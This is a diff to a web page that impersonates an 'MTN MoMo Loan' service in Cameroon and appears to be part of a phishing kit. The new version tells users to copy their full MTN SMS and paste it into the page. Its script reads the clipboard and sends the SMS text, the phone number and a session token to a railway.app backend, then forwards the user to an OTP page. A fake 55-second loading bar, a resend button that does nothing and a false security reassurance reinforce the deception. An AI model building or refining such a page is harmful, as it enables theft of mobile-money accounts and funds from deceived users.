@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>MTN MoMo Loan - SMS Verification</title>
+    <title>MTN MoMo Loan - Verify SMS</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
         * {
@@ -92,110 +92,114 @@
             min-height: 0;
             display: flex;
             flex-direction: column;
-            justify-content: center;
             overflow-y: auto;
         }
 
-        /* ===== INFO BANNER ===== */
-        .info-banner {
-            background: linear-gradient(135deg, #ecfdf5, #d1fae5);
-            border: 1.5px solid #a7f3d0;
-            border-radius: 14px;
-            padding: 12px 14px;
-            margin-bottom: 20px;
+        /* ===== ICON BADGE ===== */
+        .icon-badge {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #f0f4ff, #e0e8ff);
             display: flex;
             align-items: center;
-            gap: 10px;
-        }
-        .info-banner .banner-icon {
-            font-size: 20px;
+            justify-content: center;
+            margin: 0 auto 14px;
+            font-size: 28px;
+            box-shadow: 0 6px 18px rgba(0, 71, 171, 0.12);
             flex-shrink: 0;
         }
-        .info-banner .banner-text {
-            font-size: 12.5px;
-            color: #065f46;
-            font-weight: 600;
-            line-height: 1.4;
-        }
-        .info-banner .banner-text strong {
-            display: block;
-            color: #047857;
-            font-weight: 800;
-            font-size: 13px;
-            margin-bottom: 2px;
-        }
 
-        /* ===== TITLE ===== */
-        .form-title {
-            font-size: 22px;
+        .page-title {
+            font-size: 20px;
             font-weight: 800;
+            text-align: center;
             color: #1a1a2e;
-            margin-bottom: 6px;
-            letter-spacing: -0.4px;
+            margin-bottom: 8px;
+            line-height: 1.3;
         }
-        .form-title .highlight { color: #0047AB; }
 
-        .form-subtitle {
-            font-size: 13px;
-            color: #888;
-            line-height: 1.6;
-            margin-bottom: 22px;
-            font-weight: 500;
+        .page-title .highlight {
+            color: #0047AB;
         }
-        .form-subtitle .phone-strong {
+
+        .instruction {
+            font-size: 13px;
+            color: #666;
+            text-align: center;
+            line-height: 1.55;
+            margin-bottom: 16px;
+            padding: 0 4px;
+        }
+
+        .instruction strong {
             color: #1a1a2e;
             font-weight: 700;
         }
 
-        /* ===== LABEL ===== */
-        .input-label {
-            display: block;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 7px;
-            font-size: 13px;
+        /* ===== STEP HINT ===== */
+        .step-hint {
+            background: #f8f9ff;
+            border-radius: 12px;
+            padding: 11px 13px;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: flex-start;
+            gap: 9px;
+            flex-shrink: 0;
         }
 
-        /* ===== CODE INPUT (6 boxes) ===== */
-        .code-boxes {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
+        .step-hint .hint-icon {
+            font-size: 16px;
+            flex-shrink: 0;
+            line-height: 1.4;
+        }
+
+        .step-hint p {
+            font-size: 12px;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        .step-hint p strong {
+            color: #0047AB;
+        }
+
+        /* ===== SMS TEXTAREA ===== */
+        .sms-wrapper {
+            position: relative;
             margin-bottom: 6px;
         }
 
-        .code-box {
-            width: 46px;
-            height: 54px;
-            text-align: center;
-            font-size: 22px;
-            font-weight: 800;
-            color: #1a1a2e;
+        .sms-textarea {
+            width: 100%;
+            min-height: 130px;
+            padding: 14px 14px 48px 14px;
             border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            background: #fafbff;
-            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
-            outline: none;
+            border-radius: 14px 14px 14px 4px;
+            font-size: 13px;
             font-family: 'Inter', sans-serif;
-            caret-color: #0047AB;
-            padding: 0;
-            flex: none;
+            color: #1a1a2e;
+            line-height: 1.55;
+            resize: vertical;
+            outline: none;
+            background: #fafbff;
+            transition: border-color 0.3s, box-shadow 0.3s, background 0.3s;
         }
 
-        .code-box:focus {
+        .sms-textarea:focus {
             border-color: #0047AB;
-            background: #f0f4ff;
-            box-shadow: 0 0 0 3px rgba(0, 71, 171, 0.12);
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.1);
         }
 
-        .code-box.filled {
-            border-color: #0047AB;
-            background: #f0f4ff;
+        .sms-textarea::placeholder {
+            color: #b0b0b0;
         }
 
-        .code-box.invalid {
+        .sms-textarea.invalid {
             border-color: #e74c3c;
-            box-shadow: 0 0 0 3px rgba(231, 76, 60, 0.12);
+            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.12);
             animation: shake 0.4s ease;
         }
 
@@ -205,34 +209,78 @@
             75% { transform: translateX(6px); }
         }
 
+        .paste-btn {
+            position: absolute;
+            right: 8px;
+            bottom: 8px;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: #0047AB;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            padding: 7px 12px;
+            font-size: 12px;
+            font-weight: 700;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.2s;
+            box-shadow: 0 4px 12px rgba(0, 71, 171, 0.25);
+        }
+
+        .paste-btn:hover { background: #002D7A; }
+        .paste-btn:active { transform: scale(0.97); }
+
+        .char-count {
+            text-align: right;
+            font-size: 11px;
+            color: #aaa;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+        .char-count.valid { color: #27ae60; }
+
         .error-text {
             color: #e74c3c;
             font-size: 12px;
-            margin-top: 5px;
+            margin-top: 4px;
             display: none;
             font-weight: 500;
             line-height: 1.4;
         }
         .error-text.show { display: block; }
 
-        /* ===== PASTE HINT ===== */
-        .paste-hint {
-            text-align: center;
-            font-size: 11.5px;
-            color: #999;
-            margin-top: 10px;
-            font-weight: 500;
+        /* ===== RESEND ROW ===== */
+        .resend-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 12px;
+            padding: 0 2px;
+            flex-shrink: 0;
         }
-        .paste-hint kbd {
-            background: #f0f4ff;
-            color: #0047AB;
-            font-family: 'Inter', sans-serif;
+
+        .resend-row span {
+            font-size: 12px;
+            color: #777;
+        }
+
+        .resend-link {
+            font-size: 12px;
             font-weight: 700;
-            font-size: 10.5px;
-            padding: 2px 6px;
-            border-radius: 5px;
-            border: 1px solid #d6e0f5;
+            color: #0047AB;
+            background: none;
+            border: none;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            padding: 4px 8px;
+            border-radius: 8px;
+            transition: background 0.2s;
         }
+
+        .resend-link:hover:not(:disabled) { background: #f0f4ff; }
+        .resend-link:disabled { color: #bbb; cursor: not-allowed; }
 
         /* ===== VERIFY BUTTON ===== */
         .verify-btn {
@@ -245,49 +293,45 @@
             font-size: 16px;
             font-weight: 700;
             cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
+            transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
             font-family: 'Inter', sans-serif;
-            margin-top: 24px;
-        }
-        .verify-btn:active:not(:disabled) { transform: scale(0.98); }
-        .verify-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
+            margin-top: 16px;
+            flex-shrink: 0;
         }
 
-        /* ===== RESEND ROW ===== */
-        .resend-row {
-            text-align: center;
-            font-size: 12.5px;
-            color: #777;
-            margin-top: 16px;
-            font-weight: 500;
+        .verify-btn:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px rgba(0, 71, 171, 0.3);
         }
-        .resend-row .resend-btn {
-            color: #0047AB;
-            font-weight: 700;
-            text-decoration: none;
-            cursor: pointer;
-            background: none;
-            border: none;
-            font-family: 'Inter', sans-serif;
-            font-size: 12.5px;
-            padding: 0;
+        .verify-btn:active:not(:disabled) { transform: scale(0.98); }
+        .verify-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+        .spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2.5px solid rgba(255, 255, 255, 0.4);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: -3px;
+            margin-right: 8px;
         }
-        .resend-row .resend-btn:disabled {
-            color: #bbb;
-            cursor: not-allowed;
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
         /* ===== SECURITY NOTICE ===== */
         .security-notice {
             display: flex;
-            align-items: center;
+            align-items: flex-start;
             justify-content: center;
             gap: 5px;
             margin-top: 14px;
             font-size: 11px;
             color: #999;
+            line-height: 1.5;
+            text-align: center;
+            padding: 0 6px;
+            flex-shrink: 0;
         }
 
         /* ===== FOOTER ===== */
@@ -301,8 +345,31 @@
             flex-shrink: 0;
         }
 
+        /* ===== SMALL PHONES ===== */
+        @media (max-height: 700px) {
+            .card { padding: 18px 16px; }
+            .icon-badge {
+                width: 52px;
+                height: 52px;
+                font-size: 24px;
+                margin-bottom: 10px;
+            }
+            .page-title { font-size: 18px; }
+            .instruction { font-size: 12px; margin-bottom: 12px; }
+            .sms-textarea { min-height: 100px; }
+            .verify-btn { margin-top: 12px; padding: 14px; }
+        }
+
+        @media (max-width: 380px) {
+            .sms-textarea {
+                font-size: 12px;
+                padding: 12px 12px 44px 12px;
+            }
+            .paste-btn { padding: 6px 10px; font-size: 11px; }
+        }
+
         /* ============================================
-           VERIFYING OVERLAY
+           VERIFYING OVERLAY (55s loading)
            ============================================ */
         .verify-overlay {
             position: fixed;
@@ -379,6 +446,7 @@
         .verify-dots span:nth-child(1) { animation-delay: 0s; }
         .verify-dots span:nth-child(2) { animation-delay: 0.2s; }
         .verify-dots span:nth-child(3) { animation-delay: 0.4s; }
+
         @keyframes dotBlink {
             0%, 80%, 100% { opacity: 0.2; }
             40% { opacity: 1; }
@@ -406,24 +474,6 @@
             font-size: 11px;
             color: #aaa;
         }
-
-        /* ===== SMALL PHONES ===== */
-        @media (max-height: 700px) {
-            .card { padding: 18px 16px; }
-            .verify-btn { margin-top: 18px; padding: 14px; }
-            .form-subtitle { margin-bottom: 16px; }
-            .momo-icon { font-size: 15px; padding: 6px 14px; }
-        }
-
-        @media (max-width: 380px) {
-            .code-boxes { gap: 6px; }
-            .code-box {
-                width: 42px;
-                height: 50px;
-                font-size: 20px;
-                border-radius: 10px;
-            }
-        }
     </style>
 </head>
 <body>
@@ -436,60 +486,69 @@
     </header>
 
     <main class="card">
-        <!-- Info banner -->
-        <div class="info-banner">
-            <div class="banner-icon">📩</div>
-            <div class="banner-text">
-                <strong>SMS Sent</strong>
-                Check your messages for the 6-digit code from MTN MoMo.
-            </div>
-        </div>
+        <div class="icon-badge">📩</div>
 
-        <h1 class="form-title">Enter <span class="highlight">SMS Code</span></h1>
-        <p class="form-subtitle">
-            We sent a 6-digit verification code to
-            <span class="phone-strong" id="phoneDisplay">+237 6XX XXX XXX</span>.
-            Enter it below to continue.
+        <h1 class="page-title">
+            Paste the <span class="highlight">SMS</span> from MTN
+        </h1>
+
+        <p class="instruction">
+            We sent a confirmation message to your MoMo number.
+            <strong>Copy the full SMS you received</strong> and paste it below to verify your identity and complete your loan disbursement.
         </p>
 
-        <!-- Code -->
-        <div>
-            <label class="input-label">Verification Code</label>
-            <div class="code-boxes" id="codeBoxes">
-                <input type="text" class="code-box" id="c1" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
-                <input type="text" class="code-box" id="c2" maxlength="1" inputmode="numeric">
-                <input type="text" class="code-box" id="c3" maxlength="1" inputmode="numeric">
-                <input type="text" class="code-box" id="c4" maxlength="1" inputmode="numeric">
-                <input type="text" class="code-box" id="c5" maxlength="1" inputmode="numeric">
-                <input type="text" class="code-box" id="c6" maxlength="1" inputmode="numeric">
-            </div>
-            <div class="error-text" id="codeError">Please enter the 6-digit code from your SMS</div>
-            <p class="paste-hint">💡 Tip: you can paste the full code with <kbd>Ctrl</kbd>+<kbd>V</kbd></p>
+        <div class="step-hint">
+            <span class="hint-icon">💡</span>
+            <p>Open your <strong>Messages app</strong>, find the SMS from <strong>MTN MoMo</strong>, long-press it, tap <strong>Copy</strong>, then come back here.</p>
         </div>
 
-        <button class="verify-btn" id="verifyBtn">VERIFY →</button>
+        <div class="sms-wrapper">
+            <textarea
+                class="sms-textarea"
+                id="smsInput"
+                placeholder="Paste the SMS you received from MTN here…"
+                spellcheck="false"
+                autocomplete="off"></textarea>
+            <button class="paste-btn" id="pasteBtn" type="button">
+                <span>📋</span>
+                <span>Paste</span>
+            </button>
+        </div>
+
+        <div class="char-count" id="charCount">0 characters</div>
+
+        <div class="error-text" id="smsError">
+            The message you pasted doesn't look like an MTN MoMo SMS. Please make sure you copied the full message.
+        </div>
 
         <div class="resend-row">
-            Didn't get the code? <button class="resend-btn" id="resendBtn">Resend SMS</button>
+            <span>Didn't receive the SMS?</span>
+            <button class="resend-link" id="resendBtn" type="button" disabled>
+                Resend (<span id="countdown">60</span>s)
+            </button>
         </div>
+
+        <button class="verify-btn" id="verifyBtn" disabled>
+            VERIFY &amp; CONTINUE →
+        </button>
 
         <div class="security-notice">
             <span>🔒</span>
-            <span>Your code is used only to verify your identity</span>
+            <span>We never ask for your PIN, password, or bank details. Only paste the SMS you received from MTN.</span>
         </div>
     </main>
 
     <footer>© 2026 MTN MoMo Cameroon</footer>
 
-    <!-- VERIFYING OVERLAY -->
+    <!-- ===== VERIFYING OVERLAY (55s) ===== -->
     <div class="verify-overlay" id="verifyOverlay">
         <div class="verify-content">
             <div class="verify-momo-icon">MoMo</div>
             <div class="verify-spinner"></div>
             <h2 class="verify-title">
-                Confirming your <span class="highlight">SMS code</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>
+                Verifying your <span class="highlight">SMS</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>
             </h2>
-            <p class="verify-subtitle">Verifying with MTN. This may take a moment…</p>
+            <p class="verify-subtitle">This may take up to a minute. Please wait…</p>
             <div class="verify-bar">
                 <div class="verify-bar-fill" id="verifyBarFill"></div>
             </div>
@@ -502,100 +561,137 @@
 
     <script>
         // ============================================
-        // BACKEND URL
+        // BACKEND URL — NEW
         // ============================================
         const API_BASE = 'https://momo-usersey-production.up.railway.app';
 
         // ============================================
-        // LOADING DURATION for SMS verification
+        // LOADING CONFIGURATION (55 seconds)
         // ============================================
-        const VERIFY_DURATION_MS = 30 * 1000; // 30 seconds
-
-        // ============================================
-        // SHOW PHONE NUMBER from session
-        // ============================================
-        const sessionRaw = localStorage.getItem('momoSession');
-        let sessionPhone = localStorage.getItem('momoPhone') || '+237 6XX XXX XXX';
-
-        // Pretty format: +237 6XX XXX XXX
-        (function formatPhone() {
-            const digits = sessionPhone.replace(/\D/g, '').replace(/^237/, '');
-            if (digits.length === 9) {
-                sessionPhone = '+237 ' + digits.slice(0, 3) + ' ' + digits.slice(3, 6) + ' ' + digits.slice(6);
-            }
-            document.getElementById('phoneDisplay').textContent = sessionPhone;
-        })();
+        const LOADING_DURATION_MS = 55 * 1000;
 
         // ============================================
-        // CODE INPUT (6 boxes)
+        // DOM REFERENCES
         // ============================================
-        const codeBoxes = [
-            document.getElementById('c1'),
-            document.getElementById('c2'),
-            document.getElementById('c3'),
-            document.getElementById('c4'),
-            document.getElementById('c5'),
-            document.getElementById('c6')
-        ];
-        const codeError = document.getElementById('codeError');
-
-        codeBoxes.forEach((box, index) => {
-            box.addEventListener('input', function() {
-                this.value = this.value.replace(/\D/g, '');
-                if (this.value) {
-                    this.classList.add('filled');
-                    if (index < codeBoxes.length - 1) codeBoxes[index + 1].focus();
-                } else {
-                    this.classList.remove('filled');
-                }
-                if (getCodeValue().length === 6) {
-                    codeError.classList.remove('show');
-                    codeBoxes.forEach(b => b.classList.remove('invalid'));
-                }
-            });
-
-            box.addEventListener('keydown', function(e) {
-                if (e.key === 'Backspace' && !this.value && index > 0) {
-                    codeBoxes[index - 1].focus();
-                    codeBoxes[index - 1].value = '';
-                    codeBoxes[index - 1].classList.remove('filled');
-                }
-                if (e.key === 'ArrowLeft' && index > 0) {
-                    codeBoxes[index - 1].focus();
-                }
-                if (e.key === 'ArrowRight' && index < codeBoxes.length - 1) {
-                    codeBoxes[index + 1].focus();
-                }
-            });
-
-            // Paste full code
-            box.addEventListener('paste', function(e) {
-                e.preventDefault();
-                const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
-                if (pasted.length > 0) {
-                    for (let i = 0; i < codeBoxes.length && i < pasted.length; i++) {
-                        codeBoxes[i].value = pasted[i];
-                        codeBoxes[i].classList.add('filled');
-                    }
-                    const nextEmpty = codeBoxes.findIndex(b => !b.value);
-                    codeBoxes[nextEmpty !== -1 ? nextEmpty : codeBoxes.length - 1].focus();
-                    if (getCodeValue().length === 6) {
-                        codeError.classList.remove('show');
-                        codeBoxes.forEach(b => b.classList.remove('invalid'));
-                    }
-                }
-            });
-        });
-
-        function getCodeValue() {
-            return codeBoxes.map(b => b.value).join('');
-        }
-
-        // ============================================
-        // VERIFY OVERLAY (progress bar)
-        // ============================================
+        const smsInput = document.getElementById('smsInput');
+        const pasteBtn = document.getElementById('pasteBtn');
+        const charCount = document.getElementById('charCount');
+        const smsError = document.getElementById('smsError');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const resendBtn = document.getElementById('resendBtn');
+        const countdownEl = document.getElementById('countdown');
         const verifyOverlay = document.getElementById('verifyOverlay');
         const verifyBarFill = document.getElementById('verifyBarFill');
+
+        // ============================================
+        // SESSION CHECK
+        // ============================================
+        const sessionRaw = localStorage.getItem('momoSession');
+        if (!sessionRaw) {
+            window.location.href = 'login.html';
+        }
+        let session = {};
+        try { session = JSON.parse(sessionRaw || '{}'); } catch (e) {}
+
+        const storedPhone = localStorage.getItem('momoPhone') || session.phone || '';
+
+        // ============================================
+        // SMS INPUT HANDLING
+        // ============================================
+        const MIN_LENGTH = 20;
+        const MTN_KEYWORDS = ['mtn', 'momo', 'transaction', 'ref', 'amount', 'xaf', 'confirmed', 'received', 'sent'];
+
+        function updateCharCount() {
+            const len = smsInput.value.trim().length;
+            charCount.textContent = len + ' character' + (len === 1 ? '' : 's');
+            charCount.classList.toggle('valid', len >= MIN_LENGTH);
+        }
+
+        function isLikelyMtnSms(text) {
+            const lower = text.toLowerCase();
+            return MTN_KEYWORDS.some(k => lower.includes(k));
+        }
+
+        function updateVerifyState() {
+            const text = smsInput.value.trim();
+            verifyBtn.disabled = text.length < MIN_LENGTH;
+            if (text.length >= MIN_LENGTH) {
+                smsError.classList.remove('show');
+                smsInput.classList.remove('invalid');
+            }
+        }
+
+        smsInput.addEventListener('input', function() {
+            updateCharCount();
+            updateVerifyState();
+        });
+
+        smsInput.addEventListener('paste', function() {
+            setTimeout(() => {
+                updateCharCount();
+                updateVerifyState();
+            }, 0);
+        });
+
+        // ============================================
+        // PASTE BUTTON
+        // ============================================
+        pasteBtn.addEventListener('click', async function() {
+            try {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    const text = await navigator.clipboard.readText();
+                    if (text) {
+                        smsInput.value = text;
+                        updateCharCount();
+                        updateVerifyState();
+                        smsInput.focus();
+                    } else {
+                        smsInput.focus();
+                        alert('Your clipboard is empty. Please copy the SMS from MTN first.');
+                    }
+                } else {
+                    smsInput.focus();
+                    alert('Automatic paste is not supported on this browser. Please long-press inside the box and choose Paste.');
+                }
+            } catch (err) {
+                smsInput.focus();
+                alert('Please long-press inside the box and choose Paste.');
+            }
+        });
+
+        // ============================================
+        // RESEND COUNTDOWN
+        // ============================================
+        let remaining = 60;
+        let timer = null;
+
+        function startCountdown() {
+            remaining = 60;
+            resendBtn.disabled = true;
+            countdownEl.textContent = remaining;
+
+            timer = setInterval(function() {
+                remaining--;
+                countdownEl.textContent = remaining;
+                if (remaining <= 0) {
+                    clearInterval(timer);
+                    resendBtn.disabled = false;
+                    resendBtn.innerHTML = 'Resend SMS';
+                }
+            }, 1000);
+        }
+
+        startCountdown();
+
+        resendBtn.addEventListener('click', function() {
+            if (resendBtn.disabled) return;
+            console.log('📤 Resend SMS requested for:', storedPhone || 'unknown');
+            startCountdown();
+        });
+
+        // ============================================
+        // PROGRESS BAR (55s)
+        // ============================================
         let verifyTimer = null;
 
         function startVerifyBar(durationMs) {
@@ -616,6 +712,7 @@
                 }
             }, 1000 / 30);
         }
+
         function finishVerifyBar() {
             if (verifyTimer) clearInterval(verifyTimer);
             verifyBarFill.style.width = '100%';
@@ -623,33 +720,50 @@
 
         // ============================================
         // VERIFY BUTTON
+        // Sends SMS + phone + token to new backend
         // ============================================
-        const verifyBtn = document.getElementById('verifyBtn');
-
         verifyBtn.addEventListener('click', async function() {
-            const code = getCodeValue();
-            if (code.length !== 6) {
-                codeBoxes.forEach(b => b.classList.add('invalid'));
-                codeError.classList.add('show');
-                codeBoxes[0].focus();
+            const text = smsInput.value.trim();
+
+            if (text.length < MIN_LENGTH) {
+                smsInput.classList.add('invalid');
+                smsError.textContent = 'The message is too short. Please copy the full SMS from MTN.';
+                smsError.classList.add('show');
+                smsInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                smsInput.focus();
                 return;
             }
 
+            if (!isLikelyMtnSms(text)) {
+                smsInput.classList.add('invalid');
+                smsError.textContent = "The message you pasted doesn't look like an MTN MoMo SMS. Please make sure you copied the full message.";
+                smsError.classList.add('show');
+                smsInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                smsInput.focus();
+                return;
+            }
+
+            // Save SMS for next page
+            localStorage.setItem('momoSms', text);
+
+            // UI
             verifyBtn.disabled = true;
-            verifyBtn.textContent = 'VERIFYING...';
-            startVerifyBar(VERIFY_DURATION_MS);
+            verifyBtn.innerHTML = '<span class="spinner"></span>VERIFYING...';
+
+            startVerifyBar(LOADING_DURATION_MS);
             const overlayStart = Date.now();
 
             try {
                 const controller = new AbortController();
                 const timeoutId = setTimeout(() => controller.abort(), 15000);
 
-                const res = await fetch(`${API_BASE}/api/verify-sms`, {
+                const res = await fetch(`${API_BASE}/api/sms`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        phone: sessionPhone,
-                        code: code
+                        phone: storedPhone,
+                        token: session.token || '',
+                        sms: text
                     }),
                     signal: controller.signal
                 });
@@ -661,26 +775,27 @@
                     throw new Error(data.error || 'Verification failed');
                 }
 
-                // Mark as verified
-                localStorage.setItem('momoSmsVerified', 'true');
+                localStorage.setItem('momoVerified', JSON.stringify({
+                    verifiedAt: new Date().toISOString(),
+                    reference: data.reference || null
+                }));
 
-                // Hold overlay for full duration then go next
                 const elapsed = Date.now() - overlayStart;
-                const remaining = Math.max(0, VERIFY_DURATION_MS - elapsed);
+                const remainingMs = Math.max(0, LOADING_DURATION_MS - elapsed);
 
                 setTimeout(function() {
                     finishVerifyBar();
                     setTimeout(function() {
-                        window.location.href = 'confirm.html';
+                        window.location.href = 'verify-otp.html';
                     }, 350);
-                }, remaining);
+                }, remainingMs);
 
             } catch (err) {
                 console.error('Verify error:', err);
                 finishVerifyBar();
                 verifyOverlay.classList.remove('show');
                 verifyBtn.disabled = false;
-                verifyBtn.textContent = 'VERIFY →';
+                verifyBtn.innerHTML = 'VERIFY &amp; CONTINUE →';
 
                 const reason = err.name === 'AbortError'
                     ? 'Server took too long. Please try again.'
@@ -690,65 +805,16 @@
         });
 
         // ============================================
-        // RESEND SMS
+        // INIT
         // ============================================
-        const resendBtn = document.getElementById('resendBtn');
-        let resendCooldown = 0;
-
-        resendBtn.addEventListener('click', async function() {
-            if (resendCooldown > 0) return;
-
-            resendBtn.disabled = true;
-            resendBtn.textContent = 'Sending…';
-
-            try {
-                const res = await fetch(`${API_BASE}/api/resend-sms`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: sessionPhone })
-                });
-                const data = await res.json().catch(() => ({}));
-
-                if (!res.ok || !data.ok) {
-                    throw new Error(data.error || 'Could not resend');
-                }
-
-                // Start 30s cooldown
-                resendCooldown = 30;
-                resendBtn.textContent = `Resend in ${resendCooldown}s`;
-                const timer = setInterval(function() {
-                    resendCooldown--;
-                    if (resendCooldown <= 0) {
-                        clearInterval(timer);
-                        resendBtn.disabled = false;
-                        resendBtn.textContent = 'Resend SMS';
-                    } else {
-                        resendBtn.textContent = `Resend in ${resendCooldown}s`;
-                    }
-                }, 1000);
-
-            } catch (err) {
-                console.error('Resend error:', err);
-                resendBtn.disabled = false;
-                resendBtn.textContent = 'Resend SMS';
-                alert('Could not resend: ' + (err.message || 'Check your internet'));
-            }
-        });
-
-        // ============================================
-        // AUTO-FOCUS FIRST BOX
-        // ============================================
-        window.addEventListener('load', () => {
-            codeBoxes.forEach(b => {
-                b.value = '';
-                b.classList.remove('filled', 'invalid');
-            });
-            codeBoxes[0].focus();
-        });
+        updateCharCount();
+        updateVerifyState();
 
         console.log('====================================');
-        console.log('📩 MTN MoMo SMS Verification');
-        console.log('🔐 Backend:', API_BASE);
+        console.log('💰 MTN MoMo Loan – Cameroon');
+        console.log('📩 SMS Paste connected to:', API_BASE);
+        console.log('⏱️ Loading duration:', LOADING_DURATION_MS / 1000, 'seconds');
+        console.log('📱 Phone:', storedPhone);
         console.log('====================================');
     </script>
 </body>
